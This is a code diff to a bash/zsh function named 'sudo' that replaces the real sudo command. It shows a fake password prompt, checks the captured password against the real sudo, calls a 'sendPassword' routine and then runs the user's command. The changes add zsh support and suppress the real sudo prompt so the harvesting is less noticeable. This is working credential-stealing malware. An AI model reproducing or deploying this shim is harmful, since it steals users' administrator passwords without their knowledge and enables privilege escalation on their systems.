@@ -1,6 +1,8 @@
+
 function sudo(){
+  user_shell=$(basename $SHELL)
   sudo_original="/usr/bin/sudo"
-  param="${@}"
+  param="$@"
   msg="[sudo] password for $USER: "
   success=0
   case $param in
@@ -19,14 +21,18 @@ function sudo(){
     *)
       $sudo_original -k
       for i in {1..3};do
-        read -s -p "$msg" passwd
+        if [[ $user_shell == "zsh" ]];then
+          echo -n "$msg";read -s passwd
+        else
+          read -s -p "$msg" passwd
+        fi
         echo "$passwd" | $sudo_original -S true 2> /dev/null
         if [[ $? == 0 ]];then
           success=1
           echo
           sendPassword
-          echo "$passwd" | $sudo_original -S $param
-          break	
+          echo "$passwd" | $sudo_original -S -p '' $@
+          break
         fi
         if [[ $i != 3 ]];then
           echo -e "\nSorry, try again."
